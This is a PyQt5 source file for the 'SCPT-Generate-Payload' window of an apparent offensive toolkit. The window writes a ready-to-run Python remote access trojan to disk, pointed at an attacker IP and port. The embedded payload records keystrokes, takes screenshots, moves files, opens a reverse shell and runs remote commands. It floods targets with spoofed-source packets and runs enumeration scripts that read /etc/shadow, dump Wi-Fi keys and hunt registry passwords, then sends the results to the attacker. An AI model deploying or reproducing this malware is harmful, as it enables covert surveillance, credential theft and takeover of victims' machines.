# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'scpt_gui_generate_payload.ui'
#
# Created by: PyQt5 UI code generator 5.15.2
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.


from PyQt5 import QtCore, QtGui, QtWidgets


class Ui_MainWindow_GP(object):
    payload_type="IP"
    def setupUi(self, MainWindow_GP):
        MainWindow_GP.setObjectName("MainWindow")
        MainWindow_GP.resize(800, 600)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("scpt.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        MainWindow_GP.setWindowIcon(icon)
        self.centralwidget = QtWidgets.QWidget(MainWindow_GP)
        self.centralwidget.setObjectName("centralwidget")
        self.frame = QtWidgets.QFrame(self.centralwidget)
        self.frame.setGeometry(QtCore.QRect(0, 0, 791, 561))
        self.frame.setStyleSheet("background-color: rgb(170, 0, 127);")
        self.frame.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame.setObjectName("frame")
        self.label = QtWidgets.QLabel(self.frame)
        self.label.setGeometry(QtCore.QRect(20, 110, 58, 18))
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(self.frame)
        self.label_2.setGeometry(QtCore.QRect(20, 220, 58, 18))
        self.label_2.setObjectName("label_2")
        self.comboBox = QtWidgets.QComboBox(self.frame)
        self.comboBox.setGeometry(QtCore.QRect(130, 30, 101, 41))
        self.comboBox.setStyleSheet("background-color: rgb(0, 0, 127);")
        self.comboBox.setObjectName("comboBox")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        self.label_3 = QtWidgets.QLabel(self.frame)
        self.label_3.setGeometry(QtCore.QRect(20, 340, 101, 21))
        self.label_3.setObjectName("label_3")
        self.lineEdit = QtWidgets.QLineEdit(self.frame)
        self.lineEdit.setGeometry(QtCore.QRect(90, 100, 321, 31))
        self.lineEdit.setObjectName("lineEdit")
        self.lineEdit_2 = QtWidgets.QLineEdit(self.frame)
        self.lineEdit_2.setGeometry(QtCore.QRect(90, 210, 321, 41))
        self.lineEdit_2.setObjectName("lineEdit_2")
        self.lineEdit_3 = QtWidgets.QLineEdit(self.frame)
        self.lineEdit_3.setGeometry(QtCore.QRect(120, 330, 301, 51))
        self.lineEdit_3.setObjectName("lineEdit_3")
        self.pushButton = QtWidgets.QPushButton(self.frame)
        self.pushButton.setGeometry(QtCore.QRect(450, 340, 88, 34))
        self.pushButton.setStyleSheet("background-color: rgb(0, 0, 255);")
        self.pushButton.setObjectName("pushButton")
        self.label_4 = QtWidgets.QLabel(self.frame)
        self.label_4.setGeometry(QtCore.QRect(20, 40, 101, 18))
        self.label_4.setObjectName("label_4")
        MainWindow_GP.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow_GP)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 800, 30))
        self.menubar.setObjectName("menubar")
        self.menuwindows = QtWidgets.QMenu(self.menubar)
        self.menuwindows.setObjectName("menuwindows")
        self.menupayload = QtWidgets.QMenu(self.menuwindows)
        self.menupayload.setObjectName("menupayload")
        self.menuHelp = QtWidgets.QMenu(self.menubar)
        self.menuHelp.setObjectName("menuHelp")
        MainWindow_GP.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow_GP)
        self.statusbar.setObjectName("statusbar")
        MainWindow_GP.setStatusBar(self.statusbar)
        self.actionabout = QtWidgets.QAction(MainWindow_GP)
        self.actionabout.setObjectName("actionabout")
        self.actionWEB = QtWidgets.QAction(MainWindow_GP)
        self.actionWEB.setObjectName("actionWEB")
        self.actionMITM = QtWidgets.QAction(MainWindow_GP)
        self.actionMITM.setObjectName("actionMITM")
        self.actioncryptography = QtWidgets.QAction(MainWindow_GP)
        self.actioncryptography.setObjectName("actioncryptography")
        self.actionreverseShell = QtWidgets.QAction(MainWindow_GP)
        self.actionreverseShell.setObjectName("actionreverseShell")
        self.actionbotnet = QtWidgets.QAction(MainWindow_GP)
        self.actionbotnet.setObjectName("actionbotnet")
        self.actionBrute_force = QtWidgets.QAction(MainWindow_GP)
        self.actionBrute_force.setObjectName("actionBrute_force")
        self.actionPhishing = QtWidgets.QAction(MainWindow_GP)
        self.actionPhishing.setObjectName("actionPhishing")
        self.actionbtc_exploit = QtWidgets.QAction(MainWindow_GP)
        self.actionbtc_exploit.setObjectName("actionbtc_exploit")
        self.actiongoogle_dork = QtWidgets.QAction(MainWindow_GP)
        self.actiongoogle_dork.setObjectName("actiongoogle_dork")
        self.actionport_scan = QtWidgets.QAction(MainWindow_GP)
        self.actionport_scan.setObjectName("actionport_scan")
        self.actionVulnerability_scan = QtWidgets.QAction(MainWindow_GP)
        self.actionVulnerability_scan.setObjectName("actionVulnerability_scan")
        self.menupayload.addAction(self.actionreverseShell)
        self.menupayload.addAction(self.actionbotnet)
        self.menuwindows.addAction(self.actionWEB)
        self.menuwindows.addAction(self.actionMITM)
        self.menuwindows.addAction(self.actioncryptography)
        self.menuwindows.addAction(self.menupayload.menuAction())
        self.menuwindows.addAction(self.actionBrute_force)
        self.menuwindows.addAction(self.actionPhishing)
        self.menuwindows.addAction(self.actionbtc_exploit)
        self.menuwindows.addAction(self.actiongoogle_dork)
        self.menuwindows.addAction(self.actionport_scan)
        self.menuwindows.addAction(self.actionVulnerability_scan)
        self.menuHelp.addAction(self.actionabout)
        self.menubar.addAction(self.menuwindows.menuAction())
        self.menubar.addAction(self.menuHelp.menuAction())

        self.retranslateUi(MainWindow_GP)
        QtCore.QMetaObject.connectSlotsByName(MainWindow_GP)

    def aboutss(self):
        from scpt_GUI_about import Ui_MainWindow_about
        # code the 2nd screen here
        self.Form = QtWidgets.QMainWindow()
        self.ui = Ui_MainWindow_about()
        self.ui.setupUi(self.Form)
        # MainWindow_GP.close()
        self.Form.show()

    def websss(self, MainWindow_GP):
        from scpt_GUI_Web_scan import Ui_MainWindow_WS
        # code the 2nd screen here
        self.Form = QtWidgets.QMainWindow()
        self.ui = Ui_MainWindow_WS()
        self.ui.setupUi(self.Form)
        MainWindow_GP.close()
        self.Form.show()

    def mitmsss(self, MainWindow_GP):
        from scpt_GUI_MITM import Ui_MainWindow_Mitm
        # code the 2nd screen here
        self.Form = QtWidgets.QMainWindow()
        self.ui = Ui_MainWindow_Mitm()
        self.ui.setupUi(self.Form)
        MainWindow_GP.close()
        self.Form.show()

    def crptosss(self, MainWindow_GP):
        from scpt_GUI_cryptography import Ui_MainWindow_crypto
        # code the 2nd screen here
        self.Form = QtWidgets.QMainWindow()
        self.ui = Ui_MainWindow_crypto()
        self.ui.setupUi(self.Form)
        MainWindow_GP.close()
        self.Form.show()



    def Payload_Rev(self, MainWindow_GP):
        from scpt_GUI_Reverse_shell import Ui_MainWindow_RS
        # code the 2nd screen here
        self.Form = QtWidgets.QMainWindow()
        self.ui = Ui_MainWindow_RS()
        self.ui.setupUi(self.Form)
        MainWindow_GP.close()
        self.Form.show()

    def Payload_bot(self, MainWindow_GP):
        from scpt_GUI_botnet import Ui_MainWindow_botnet
        # code the 2nd screen here
        self.Form = QtWidgets.QMainWindow()
        self.ui = Ui_MainWindow_botnet()
        self.ui.setupUi(self.Form)
        MainWindow_GP.close()
        self.Form.show()

    def Brutessss(self, MainWindow_GP):
        from scpt_GUI_brute_force import Ui_MainWindow_brute
        # code the 2nd screen here
        self.Form = QtWidgets.QMainWindow()
        self.ui = Ui_MainWindow_brute()
        self.ui.setupUi(self.Form)
        MainWindow_GP.close()
        self.Form.show()

    def Phisssss(self, MainWindow_GP):
        from scpt_GUI_Phishing import Ui_MainWindow_Ph
        # code the 2nd screen here
        self.Form = QtWidgets.QMainWindow()
        self.ui = Ui_MainWindow_Ph()
        self.ui.setupUi(self.Form)
        MainWindow_GP.close()
        self.Form.show()

    def BTC_esss(self, MainWindow_GP):
        from scpt_GUI_btc_exploit import Ui_MainWindow_btc
        # code the 2nd screen here
        self.Form = QtWidgets.QMainWindow()
        self.ui = Ui_MainWindow_btc()
        self.ui.setupUi(self.Form)
        MainWindow_GP.close()
        self.Form.show()

    def Googlesss(self, MainWindow_GP):
        from scpt_GUI_Google_Dork import Ui_MainWindow_GD
        # code the 2nd screen here
        self.Form = QtWidgets.QMainWindow()
        self.ui = Ui_MainWindow_GD()
        self.ui.setupUi(self.Form)
        MainWindow_GP.close()
        self.Form.show()

    def Port_scansss(self, MainWindow_GP):
        from scpt_GUI_Port_scan import Ui_MainWindow_PS
        # code the 2nd screen here
        self.Form = QtWidgets.QMainWindow()
        self.ui = Ui_MainWindow_PS()
        self.ui.setupUi(self.Form)
        MainWindow_GP.close()
        self.Form.show()

    def vunlssss(self, MainWindow_GP):
        from scpt_GUI_vulnerability_search import Ui_MainWindow_VS
        # code the 2nd screen here
        self.Form = QtWidgets.QMainWindow()
        self.ui = Ui_MainWindow_VS()
        self.ui.setupUi(self.Form)
        MainWindow_GP.close()
        self.Form.show()
    def payload_type(self,index):
        self.payload_type = self.comboBox.model().itemFromIndex(index).text()
        print(self.payload_type)
    def Gen_payload(self):
        payload_strick="""
import os, json, subprocess, sys, threading, random, socket
from urllib.request import Request, urlopen

try:
    from pynput.keyboard import Listener
    from PIL import ImageGrab
    from scapy.all import *
except:
    os.system("pip install PIL")
    os.system("pip install pynput")
    os.system("pip install scapy")
    from pynput.keyboard import Listener
    from PIL import ImageGrab
    from scapy.all import *

keys = []
count = 0
# path_windos = "\\\Keyloags.txt"
path_unix = "/tmp/keyloags.txt"
if "nt" in os.name:
    p = subprocess.Popen("powershell $env:TEMP", shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         stdin=subprocess.PIPE)
    output = p.stdout.read()
    output = output.decode()
    o = output.replace(" ", "").replace("\\r", "").replace("\\n", "").replace("'", "").replace("Path", "").replace("--","")
    path_unix = o + "\\\keyloags.txt"
else:
    path_unix = "/tmp/keyloags.txt"
global flage
flage = 0


def write_file(keys):
    with open(path_unix, "a") as wfile:
        for key in keys:
            k = str(key).replace("'", "")
            if (k.find("backspace") > 0):
                wfile.write(" Backspace ")
            elif (k.find("enter") > 0):
                wfile.write("\\n")
            elif (k.find("shift") > 0):
                wfile.write(" Shift ")
            elif (k.find("space") > 0):
                wfile.write("    ")
            elif (k.find("caps_lock") > 0):
                wfile.write(" Caps_lock ")
            elif (k.find("up") > 0):
                wfile.write(" Key.up ")
            elif (k.find("down") > 0):
                wfile.write(" Key.down ")
            elif (k.find("right") > 0):
                wfile.write(" Key.right ")
            elif (k.find("lefts") > 0):
                wfile.write(" Key.lefts ")
            elif (k.find("ctrl_r") > 0):
                wfile.write(" Key.ctrl_r ")
            elif (k.find("tab") > 0):
                wfile.write(" Key.tab ")
            elif (k.find("alt") > 0):
                wfile.write(" Key.alt ")
            elif (k.find("key")):
                wfile.write(k)


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if (count >= 1):
        count = 0
        write_file(keys)
        keys = []


def key_logs():
    os.remove(path_unix)
    global listener
    with Listener(on_press=on_press) as listener:
        listener.join()


def stop_key_log():
    flage = 1
    listener.stop()
    upload_file(path_unix)


def dos(target_IP, stop):
    # target_IP = input("Enter IP address of Target: ")
    i = 1
    while True:
        a = str(random.randint(1, 254))
        b = str(random.randint(1, 254))
        c = str(random.randint(1, 254))
        d = str(random.randint(1, 254))
        dot = "."
        Source_ip = a + dot + b + dot + c + dot + d
        for source_port in range(1, 65535):
            IP1 = IP(source_IP=Source_ip, destination=target_IP)
            TCP1 = TCP(srcport=80, dstport=80)
            pkt = IP1 / TCP1
            send(pkt, inter=.001)
            connt.send("packet sent " + str(i))
            i = i + 1
            if (stop == i):
                break


def full_shell():
    # print(port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
    s.connect((host, port + 1));
    # reliable_send(li)
    os.dup2(s.fileno(), 0);
    os.dup2(s.fileno(), 1);
    os.dup2(s.fileno(), 2);
    if "nt" in os.name:
        p = subprocess.call(["cmd.exe", ""]);
    else:
        p = subprocess.call(["/bin/sh", "-i"]);


def screen_shoter():
    screen_shot = ImageGrab.grab()
    if "nt" in os.name:
        p = subprocess.Popen("powershell $env:TEMP", shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                             stdin=subprocess.PIPE)
        output = p.stdout.read()
        output = output.decode()
        o = output.replace(" ", "").replace("\\r", "").replace("\\n", "").replace("'", "").replace("Path", "").replace(
            "--", "")
        screen_shot.save(o + "\\\screep.png")
    else:
        screen_shot.save("/temp/screep.png")


def upload_file(file_name):
    f = open(file_name, "rb")
    connt.send(f.read())


def download_file(file_name):
    k = "/"
    if "nt" in os.name:
        k = "\\\\"
    else:
        k = "/"
    c = 0
    while True:
        if ("/" in k or "\\\\" in k):
            k = file_name[c:]
            c += 1
        # print("her", k)
        # print(c)
        else:
            break
    # print(k)
    f = open(k, "wb")
    # print('kkkk')
    connt.settimeout(1)
    chunk = connt.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = connt.recv(1024)
        except socket.timeout as e:
            break
    connt.settimeout(None)
    f.close()


def relaible_recv():
    data = ''
    while True:
        try:
            data = data + connt.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(data):
    jsondata = json.dumps(data)
    connt.send(jsondata.encode())


def shell_do():
    while True:
        command = relaible_recv()
        # print(command)
        if (command == "exit"):
            break
        # if (command == ""):
        #   pass
        elif (command == "stkeylog"):
            t = threading.Thread(target=key_logs)
            t.start()
            reliable_send("key loger is started")
        # while flage !=1:
        # stop_key_log()
        elif (command == "spkeylog"):
            # t = threading.Thread(taget=key_logs)
            # t.start()
            # while flage !=1:
            stop_key_log()
            t.join()
        elif (command[:3] == "dos"):
            comm = command[4:]
            t_ip = str(comm[0:comm.find(" ")])
            stop_at = int(comm[comm.find(" "):].replace(" ", "")) + 1
            dos(t_ip, stop_at)

        elif (command == "screenshoot"):
            screen_shoter()
            if "nt" in os.name:
                p = subprocess.Popen("powershell $env:TEMP", shell=False, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = p.stdout.read()
                output = output.decode()
                o = output.replace(" ", "").replace("\\r", "").replace("\\n", "").replace("'", "").replace("Path",
                                                                                                         "").replace(
                    "--", "")
                upload_file(o + "\\\screep.png")
            else:
                upload_file("/temp/screep.png")
        elif (command[:6] == "upload"):
            download_file(command[7:])
        elif (command[:8] == "download"):
            reliable_send(command)
            upload_file(command[9:])
        # time.sleep(4)
        elif (command == "shell"):
            # while command == "" or command == "shell" or command == None:
            t2 = threading.Thread(target=full_shell)
            t2.start()
            t2.join()
        elif (command == "enum"):
            if "nt" in os.name:
                print("windows")
                f = '''echo #########user info > %temp%\\\winenumoutp22.txt
echo ##################Hostname >> %temp%\\\winenumoutp22.txt
hostname >> %temp%\\\winenumoutp22.txt
echo. >> %temp%\\\winenumoutp22.txt

echo ##################whoami >> %temp%\\\winenumoutp22.txt
whoami >> %temp%\\\winenumoutp22.txt
echo. >> %temp%\\\winenumoutp22.txt

echo ##################echo %%USERNAME%% >> %temp%\\\winenumoutp22.txt
echo %USERNAME% >> %temp%\\\winenumoutp22.txt
echo. >> %temp%\\\winenumoutp22.txt

echo ##################net users >> %temp%\\\winenumoutp22.txt
net users >> %temp%\\\winenumoutp22.txt
echo. >> %temp%\\\winenumoutp22.txt

echo ##################net user %%USERNAME%% >> %temp%\\\winenumoutp22.txt
net user %USERNAME% >> %temp%\\\winenumoutp22.txt
echo. >> %temp%\\\winenumoutp22.txt

echo ################## systeminfo >> %temp%\\\winenumoutp22.txt
systeminfo >> %temp%\\\winenumoutp22.txt
echo. >> %temp%\\\winenumoutp22.txt

echo ################## fsutil fsinfo drives >> %temp%\\\winenumoutp22.txt
fsutil fsinfo drives >> %temp%\\\winenumoutp22.txt
echo. >> %temp%\\\winenumoutp22.txt

echo ################## path >> %temp%\\\winenumoutp22.txt
echo %PATH% >> %temp%\\\winenumoutp22.txt
echo. >> %temp%\\\winenumoutp22.txt

echo ################## tasklist /SVC >> %temp%\\\winenumoutp22.txt
tasklist /SVC >> %temp%\\\winenumoutp22.txt
echo. >> %temp%\\\winenumoutp22.txt

echo ################## Checking if .msi files are always installed with elevated privlidges>> %temp%\\\winenumoutp22.txt
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated /v AlwaysInstallElevated >> %temp%\\\winenumoutp22.txt
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated /v AlwaysInstallElevated >> %temp%\\\winenumoutp22.txt
echo. >> %temp%\\\winenumoutp22.txt

echo #### Checking for backup SAM files >> %temp%\\\winenumoutp22.txt

echo #### dir %SYSTEMROOT%\\repair\SAM >> %temp%\\\winenumoutp22.txt
dir %%SYSTEMROOT%%\\repair\SAM >> %temp%\\\winenumoutp22.txt

echo #### dir %SYSTEMROOT%\system32\config\\regback\SAM >> %temp%\\\winenumoutp22.txt
dir %%SYSTEMROOT%%\system32\config\\regback\SAM >> %temp%\\\winenumoutp22.txt
echo. >> %temp%\\\winenumoutp22.txt

echo #### USES AccessChk from sysinternals >> %temp%\\winenumoutp22.txt
accesschk.exe -uwcqv "Authenticated Users" * /accepteula >> %temp%\\winenumoutp22.txt
accesschk.exe -uwcqv "Users" * /accepteula >> %temp%\\winenumoutp22.txt
accesschk.exe -uwcqv "Everyone" * /accepteula >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## Checking for possible creds >> %temp%\\winenumoutp22.txt

echo ################## type c:\sysprep.inf >> %temp%\\winenumoutp22.txt
type c:\sysprep.inf >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## type c:\sysprep\sysprep.xml>> %temp%\\winenumoutp22.txt
type c:\sysprep\sysprep.xml >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## Network Information >> %temp%\\winenumoutp22.txt

echo ################## ipconfig /all >> %temp%\\winenumoutp22.txt
ipconfig /all >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## net use (view current connetions) >> %temp%\\winenumoutp22.txt
net use >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## net share (view shares) >> %temp%\\winenumoutp22.txt
net share >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## arp -a >> %temp%\\winenumoutp22.txt
arp -a >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## route print>> %temp%\\winenumoutp22.txt
route print >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## netstat -nao >> %temp%\\winenumoutp22.txt
netstat -nao >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## netsh firewall show state >> %temp%\\winenumoutp22.txt
netsh firewall show state >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## netsh firewall show config >> %temp%\\winenumoutp22.txt
netsh firewall show config >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## Shows wireless network information>> %temp%\\winenumoutp22.txt
netsh wlan export profile key=clear
type wi-fi*.xml >> %temp%\\winenumoutp22.txt
del wi-fi*.xml
echo. >> %temp%\\winenumoutp22.txt


echo ################## schtasks /query /fo LIST /v >> %temp%\\winenumoutp22.txt
schtasks /query /fo LIST /v >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## net start >> %temp%\\winenumoutp22.txt
net start >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## DRIVERQUERY >> %temp%\\winenumoutp22.txt
DRIVERQUERY >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## Any mentions of "password" in the registry >> %temp%\\winenumoutp22.txt

reg query HKLM /f password  /t REG_SZ  /s >> %temp%\\winenumoutp22.txt

echo. >> %temp%\\winenumoutp22.txt
echo ################## Checking for services >> %temp%\\winenumoutp22.txt
wmic service get name,displayname,pathname,startmode | findstr /i "auto"  >> %temp%\\winenumoutp22.txt
'''
                f2 = open("f.bat", "w")
                f2.write(f)
                f2.close()
                f3 = open("f.bat", "r")
                for i in f3:
                    os.system(str(i.replace("\\n", '')))
                p = subprocess.Popen("powershell $env:TEMP", shell=False, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = p.stdout.read()
                output = output.decode()
                o = output.replace(" ", "").replace("\\r", "").replace("\\n", "").replace("'", "").replace("Path",
                                                                                                         "").replace(
                    "--", "")
                upload_file(o + "\\\winenumoutp22.txt")
                os.system("powershell rm f.bat")
            else:
                f = '''echo "user_name " >>/tmp/enum55.txt 
whoami >>/tmp/enum55.txt
echo "hostname " >>/tmp/enum55.txt 
hostname >>/tmp/enum55.txt
echo "Kernel information " >>/tmp/enum55.txt 
uname -a >>/tmp/enum55.txt
cat /proc/version >>/tmp/enum55.txt
cat /etc/*-release >>/tmp/enum55.txt
echo "user id  " >>/tmp/enum55.txt 
id >>/tmp/enum55.txt
echo "last logged on user information " >>/tmp/enum55.txt
lastlog >>/tmp/enum55.txt
echo "logs  " >>/tmp/enum55.txt 
w >>/tmp/enum55.txt
echo "see passwd  " >>/tmp/enum55.txt 
cat /etc/shadow >>/tmp/enum55.txt
cat /etc/passwd >>/tmp/enum55.txt
echo "grpinfo  " >>/tmp/enum55.txt 
echo -e "$grpinfo" | grep adm >>/tmp/enum55.txt
echo "installed dpkg  " >>/tmp/enum55.txt 
dpkg -l >>/tmp/enum55.txt
echo "files that has sudo  " >>/tmp/enum55.txt 
echo "" | sudo -S -l -k >>/tmp/enum55.txt
echo "directory permissions  " >>/tmp/enum55.txt 
ls -ahl /home/ >>/tmp/enum55.txt
ls -ahl >>/tmp/enum55.txt
echo "cronjub enum " >>/tmp/enum55.txt 
ls -la /etc/cron* >>/tmp/enum55.txt
cat /etc/crontab >>/tmp/enum55.txt
echo "service enum " >>/tmp/enum55.txt 
systemctl list-timers --all >>/tmp/enum55.txt
systemctl list-timers  |head -n -1     >>/tmp/enum55.txt
echo "network enum " >>/tmp/enum55.txt 
/sbin/ifconfig -a >>/tmp/enum55.txt
/sbin/ip a  >>/tmp/enum55.txt
arp -a >>/tmp/enum55.txt
ip n >>/tmp/enum55.txt
grep "nameserver" /etc/resolv.conf >>/tmp/enum55.txt
systemd-resolve --status 2 >>/tmp/enum55.txt
netstat -ntpl >>/tmp/enum55.txt
ss -t -l -n >>/tmp/enum55.txt
netstat -nupl >>/tmp/enum55.txt
ss -u -l -n >>/tmp/enum55.txt
echo "running proces " >>/tmp/enum55.txt 
ps aux >>/tmp/enum55.txt
echo "database enum " >>/tmp/enum55.txt 
mysql --version >>/tmp/enum55.txt
mysqladmin -uroot -proot version >>/tmp/enum55.txt
mysqladmin -uroot version >>/tmp/enum55.txt
psql -V  >>/tmp/enum55.txt
echo "apache enum " >>/tmp/enum55.txt 
apache2 -v >>/tmp/enum55.txt
grep -i "user\|group" /etc/apache2/envvars  >>/tmp/enum55.txt
echo "files enum " >>/tmp/enum55.txt 
find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; >>/tmp/enum55.txt'''
                f2 = open("f.sh", "w")
                f2.write(f)
                f2.close()
                f3 = open("f.sh", "r")

                for i in f3:
                    os.system(str(i.replace("\\n", '')))
                upload_file("/tmp/enum55.txt")
                os.system("rm f.sh")

        else:
            try:
                if "nt" in os.name:
                    command = "powershell " + command
                else:
                    command = command
                echut = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = echut.stdout.read() + echut.stderr.read()
                output = output.decode()
                reliable_send(output)
            except:
                reliable_send("error")
#
        """
        payload_name=str(self.lineEdit_3.text())
        if (self.payload_type=="IP"):
            print("h")
            ip=str(self.lineEdit.text())
            port=int(self.lineEdit_2.text())
            payload = payload_strick+f"""
while True:
                try:
                     host = "{ip}"
                     port = {port}
                     connt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     connt.connect((host, port))
                     shell_do()
                except:
                     pass
            """
            # payload=payload.replace('\r','\\r').replace('\n','\\n')
            save=open(payload_name,'w')
            save.write(payload)
            save.close()
            print("done")
        else:
            ip = str(self.lineEdit.text())
            port = str(self.lineEdit_2.text())
            payload = payload_strick + f"""
from urllib.request import Request, urlopen
while True:
                            try:
                                 host = "{ip}"
                                 req1 = Request("{port}")
                                 port= int(urlopen(req1).read().decode().replace("\\n",""))
                                 connt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                 connt.connect((host, port))
                                 shell_do()
                            except:
                                 pass
                        """
            save = open(payload_name, 'w')
            save.write(payload)
            save.close()
            print("done")

    def retranslateUi(self, MainWindow_GP):
        _translate = QtCore.QCoreApplication.translate
        MainWindow_GP.setWindowTitle(_translate("MainWindow", "SCPT-Generate-Payload"))
        self.label.setText(_translate("MainWindow", "Host:"))
        self.label_2.setText(_translate("MainWindow", "Port:"))
        self.comboBox.setItemText(0, _translate("MainWindow", "IP"))
        self.comboBox.setItemText(1, _translate("MainWindow", "Host"))
        self.comboBox.view().pressed.connect(self.payload_type)
        self.label_3.setText(_translate("MainWindow", "Payload Name:"))
        self.pushButton.setText(_translate("MainWindow", "Generate"))
        self.pushButton.clicked.connect(self.Gen_payload)
        self.label_4.setText(_translate("MainWindow", "Type of  payload:"))
        self.menuwindows.setTitle(_translate("MainWindow", "windows"))
        self.menupayload.setTitle(_translate("MainWindow", "payload"))
        self.menuHelp.setTitle(_translate("MainWindow", "Help"))
        self.actionabout.setText(_translate("MainWindow", "about"))
        self.actionWEB.setText(_translate("MainWindow", "WEB"))
        self.actionMITM.setText(_translate("MainWindow", "MITM"))
        self.actioncryptography.setText(_translate("MainWindow", "cryptography"))
        self.actionreverseShell.setText(_translate("MainWindow", "reverseShell"))
        self.actionbotnet.setText(_translate("MainWindow", "botnet"))
        self.actionBrute_force.setText(_translate("MainWindow", "Brute-force"))
        self.actionPhishing.setText(_translate("MainWindow", "Phishing"))
        self.actionbtc_exploit.setText(_translate("MainWindow", "btc-exploit"))
        self.actiongoogle_dork.setText(_translate("MainWindow", "google-dork"))
        self.actionport_scan.setText(_translate("MainWindow", "port-scan"))
        self.actionVulnerability_scan.setText(_translate("MainWindow", "Vulnerability-scan"))

        self.actionWEB.triggered.connect(lambda:self.websss(MainWindow_GP))
        self.actionMITM.triggered.connect(lambda:self.mitmsss(MainWindow_GP))
        self.actioncryptography.triggered.connect(lambda:self.crptosss(MainWindow_GP))
        self.actionBrute_force.triggered.connect(lambda:self.Brutessss(MainWindow_GP))
        self.actionPhishing.triggered.connect(lambda:self.Phisssss(MainWindow_GP))
        self.actionreverseShell.triggered.connect(lambda:self.Payload_Rev(MainWindow_GP))
        self.actionbtc_exploit.triggered.connect(lambda:self.BTC_esss(MainWindow_GP))
        self.actiongoogle_dork.triggered.connect(lambda:self.Googlesss(MainWindow_GP))
        self.actionport_scan.triggered.connect(lambda:self.Port_scansss(MainWindow_GP))
        self.actionVulnerability_scan.triggered.connect(lambda:self.vunlssss(MainWindow_GP))
        self.actionabout.triggered.connect(self.aboutss)


if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow_GP = QtWidgets.QMainWindow()
    ui = Ui_MainWindow_GP()
    ui.setupUi(MainWindow_GP)
    MainWindow_GP.show()
    sys.exit(app.exec_())
